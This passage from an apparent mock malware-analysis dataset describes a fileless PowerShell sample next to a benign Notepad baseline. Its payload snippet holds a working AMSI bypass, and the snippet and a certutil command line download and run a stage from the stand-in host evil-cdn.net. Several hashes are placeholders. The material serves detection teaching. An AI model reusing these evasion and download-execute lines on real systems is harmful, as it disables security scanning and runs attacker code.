      sha1: '1234567890abcdef1234567890abcdef12345678',
      sha256: '5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b',
      ssdeep: '384:vK3w+kQ93A1yUe2Z0r8bM5/K7qUe:vK3wkQ93A1yUe'
    },
    overallEntropy: 6.48,
    entropyBlocks: [4.9, 5.8, 6.9, 7.1, 6.8, 6.2, 5.1],
    peHeaders: {
      machine: 'Script / PowerShell (Non-PE)',
      numberOfSections: 0,
      timeDateStamp: 'N/A (Script Interpreted)',
      subsystem: 'Command-Line Script',
      entryPoint: '0x00000000',
      imageSize: '18.4 KB (Script Payload)'
    },
    sections: [],
    imports: [
      { dll: 'amsi.dll', functionName: 'AmsiScanBuffer', category: 'EVASION', riskDescription: 'Target of in-memory byte patching to force AMSI_RESULT_CLEAN (0x80070057 return).' },
      { dll: 'ntdll.dll', functionName: 'NtProtectVirtualMemory', category: 'EVASION', riskDescription: 'Changes memory permissions of amsi.dll memory page to PAGE_EXECUTE_READWRITE.' },
      { dll: 'kernel32.dll', functionName: 'WriteProcessMemory', category: 'INJECTION', riskDescription: 'Overwrites AmsiScanBuffer entry instructions with RET (0xC3) or error code patch.' }
    ],
    extractedStrings: [
      { value: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")', type: 'COMMAND', suspicionScore: 10 },
      { value: 'amsiInitFailed', type: 'COMMAND', suspicionScore: 9 },
      { value: 'certutil.exe -urlcache -split -f http://evil-cdn.net/stage2.bin', type: 'COMMAND', suspicionScore: 10 },
      { value: 'Invoke-ReflectivePEInjection', type: 'COMMAND', suspicionScore: 10 }
    ],
    dynamicEvents: [
      { step: 1, timestamp: '+0.008s', type: 'PROCESS_SPAWN', description: 'PowerShell started with flags: -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden', target: 'powershell.exe', severity: 'HIGH' },
      { step: 2, timestamp: '+0.035s', type: 'MEMORY_INJECT', description: 'Memory patched AmsiScanBuffer address with 0xC3 (RET instruction) in amsi.dll', target: 'amsi.dll!AmsiScanBuffer', severity: 'CRITICAL' },
      { step: 3, timestamp: '+0.070s', type: 'NETWORK_TCP', description: 'Living-off-the-land download using certutil.exe to fetch second-stage beacon', target: 'http://evil-cdn.net/stage2.bin', severity: 'HIGH' },
      { step: 4, timestamp: '+0.120s', type: 'MEMORY_INJECT', description: 'Loaded unmanaged DLL directly into memory without writing anything to disk', target: 'RAM Reflective Loader', severity: 'CRITICAL' }
    ],
    processTree: {
      id: 'p1',
      name: 'powershell.exe',
      pid: 3820,
      commandLine: 'powershell.exe -w hidden -c "$a=[Ref].Assembly.GetType..."',
      status: 'MALICIOUS',
      children: [
        {
          id: 'p2',
          name: 'certutil.exe',
          pid: 4190,
          ppid: 3820,
          commandLine: 'certutil.exe -urlcache -split -f http://evil-cdn.net/stage2.bin %TEMP%\\s2.bin',
          status: 'MALICIOUS'
        }
      ]
    },
    yaraRules: [
      {
        id: 'yara-amsi-bypass',
        name: 'EVASION_PowerShell_AMSI_Bypass',
        meta: {
          author: 'AMDS Rules',
          description: 'Detects in-memory AMSI patching strings in PowerShell scripts',
          threatFamily: 'Fileless AMSI Evasion',
          confidence: 'High'
        },
        strings: [
          { id: '$amsi1', pattern: 'AmsiUtils' },
          { id: '$amsi2', pattern: 'amsiInitFailed' },
          { id: '$amsi3', pattern: 'AmsiScanBuffer' }
        ],
        condition: 'any of them',
        matched: true,
        matchedStrings: ['$amsi1', '$amsi2', '$amsi3']
      }
    ],
    mitreTechniques: [
      { id: 'T1562.001', tactic: 'Defense Evasion', name: 'Disable or Modify Tools: AMSI Bypass', description: 'Patches Microsoft AMSI scanning buffer in memory to evade detection.', observedInSample: true },
      { id: 'T1059.001', tactic: 'Execution', name: 'PowerShell', description: 'Executes malicious scripting logic directly in process memory.', observedInSample: true },
      { id: 'T1105', tactic: 'Command and Control', name: 'Ingress Tool Transfer', description: 'Leverages certutil.exe (LOLBin) to retrieve remote stage.', observedInSample: true },
      { id: 'T1620', tactic: 'Defense Evasion', name: 'Reflective Code Loading', description: 'Loads code into process memory without touching disk storage.', observedInSample: true }
    ],
    payloadSnippet: `# PowerShell AMSI Bypass in Memory
$AmsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$AmsiField = $AmsiUtils.GetField('amsiInitFailed','NonPublic,Static')
$AmsiField.SetValue($null,$true) # Now AMSI is disabled for this session!

# Download and execute in memory
$wc = New-Object System.Net.WebClient
$rawBytes = $wc.DownloadData("http://evil-cdn.net/stage2.bin")
[System.Reflection.Assembly]::Load($rawBytes).EntryPoint.Invoke($null, $null)`,
    analysisExplanation: {
      whatItDoes: 'Fileless malware leaves no executable files on the hard drive. It runs entirely within trusted system interpreters like PowerShell, using reflection to patch Windows security APIs before running payload bytes.',
      howDetected: 'Caught through dynamic memory inspection, Event Tracing for Windows (ETW), and script block logging that flags references to AmsiUtils and LOLBin abuse (certutil).',
      whyDangerous: 'Traditional signature-based antivirus scanning the file system misses this entirely because nothing is saved to disk.'
    }
  },
  {
    id: 'benign-utility',
    name: 'Notepad / Safe Sysinternals Tool',
    fileName: 'notepad_utility.exe',
    fileSizeFormatted: '210 KB',
    category: 'BENIGN_UTILITY',
    threatVerdict: 'BENIGN: Clean System Utility',
    threatScore: 4,
    cvssScore: 0.0,
    severity: 'SAFE',
    description: 'Legitimate digitally signed Windows text editor utility. Demonstrates standard compilation patterns, clean entropy, and non-malicious standard API imports.',
    hashes: {
      md5: 'e1d7cfb3952a12903e680a31201ab5b2',
      sha1: 'ab4978643194723091bbcdfe6723910294871029',
      sha256: '7f99990184b23485720194872910384729103847291029482910482910482910',
      ssdeep: '1536:12ab34cd56ef7890:12ab34cd'
    },
    overallEntropy: 5.62,
    entropyBlocks: [4.2, 5.1, 5.6, 5.8, 5.7, 5.5, 5.2, 4.8, 3.9],
    peHeaders: {
      machine: 'Intel 386 / x86 (0x14c)',
      numberOfSections: 3,
      timeDateStamp: '2023-10-04 11:12:30 (Valid Microsoft Signature)',
      subsystem: 'Windows GUI (0x2)',
      entryPoint: '0x00401200',
      imageSize: '0x00038000 (229 KB)'
    },
    sections: [
      { name: '.text', virtualSize: 131072, rawSize: 131072, entropy: 5.82, characteristics: ['CODE', 'EXECUTE', 'READ'], isSuspicious: false },
      { name: '.rdata', virtualSize: 49152, rawSize: 49152, entropy: 4.91, characteristics: ['INITIALIZED_DATA', 'READ'], isSuspicious: false },
      { name: '.data', virtualSize: 16384, rawSize: 16384, entropy: 3.12, characteristics: ['INITIALIZED_DATA', 'READ', 'WRITE'], isSuspicious: false }
    ],
    imports: [
      { dll: 'user32.dll', functionName: 'CreateWindowExW', category: 'SYSTEM', riskDescription: 'Standard Windows GUI window creation.' },
      { dll: 'user32.dll', functionName: 'ShowWindow', category: 'SYSTEM', riskDescription: 'Displays window on user desktop.' },
      { dll: 'comdlg32.dll', functionName: 'GetOpenFileNameW', category: 'SYSTEM', riskDescription: 'Standard File Open dialog box.' },
      { dll: 'kernel32.dll', functionName: 'ReadFile', category: 'SYSTEM', riskDescription: 'Reads text file content from user-specified path.' },
      { dll: 'kernel32.dll', functionName: 'WriteFile', category: 'SYSTEM', riskDescription: 'Saves text file content to disk upon user Save command.' }
    ],
    extractedStrings: [
      { value: 'Microsoft Corporation', type: 'FILE_PATH', suspicionScore: 0 },
      { value: 'Open File Dialog', type: 'COMMAND', suspicionScore: 0 },
      { value: 'Save As...', type: 'COMMAND', suspicionScore: 0 },
      { value: 'Untitled.txt', type: 'FILE_PATH', suspicionScore: 0 }
    ],
    dynamicEvents: [
      { step: 1, timestamp: '+0.010s', type: 'PROCESS_SPAWN', description: 'Application initialized GUI thread and registered window class', target: 'user32!RegisterClassExW', severity: 'SAFE' },
      { step: 2, timestamp: '+0.030s', type: 'FILE_WRITE', description: 'Loaded system default font resources into GUI context', target: 'GDI Font Manager', severity: 'SAFE' },
      { step: 3, timestamp: '+0.050s', type: 'PROCESS_SPAWN', description: 'Entered standard Windows message pump loop (GetMessage / DispatchMessage)', target: 'Main Window Message Loop', severity: 'SAFE' }
    ],
    processTree: {
      id: 'p1',
      name: 'notepad_utility.exe',
      pid: 2904,
      commandLine: '"C:\\Windows\\notepad_utility.exe"',
      status: 'RUNNING'
    },
    yaraRules: [
      {
        id: 'yara-clean-test',
        name: 'BENIGN_Microsoft_Utility_Marker',
        meta: {
          author: 'AMDS Whitelist',
          description: 'Validates standard Windows utility characteristics',
          threatFamily: 'Benign Software',
          confidence: 'High'
        },
        strings: [
          { id: '$s1', pattern: 'Microsoft Corporation' }
        ],
        condition: '$s1',
        matched: true,
        matchedStrings: ['$s1']
      }
    ],
    mitreTechniques: [],
    payloadSnippet: `// Standard Windows GUI Window Procedure
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
        case WM_COMMAND:
            if (LOWORD(wParam) == ID_FILE_OPEN) {
                PromptOpenFileDialog(hWnd);
            } else if (LOWORD(wParam) == ID_FILE_SAVE) {
                SaveActiveDocument(hWnd);
            }
            break;
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}`,
    analysisExplanation: {
      whatItDoes: 'Standard Windows desktop text editor. Opens, edits, and saves text files at explicit user instruction.',
      howDetected: 'Static analysis shows standard non-packed entropy (~5.6), benign standard Windows API calls, valid code signing certificate, and zero anomalous network or memory injection attempts.',
      whyDangerous: 'Completely safe. Serves as a baseline benchmark for evaluating false positive rates in heuristic malware detection engines.'
    }
  }
];
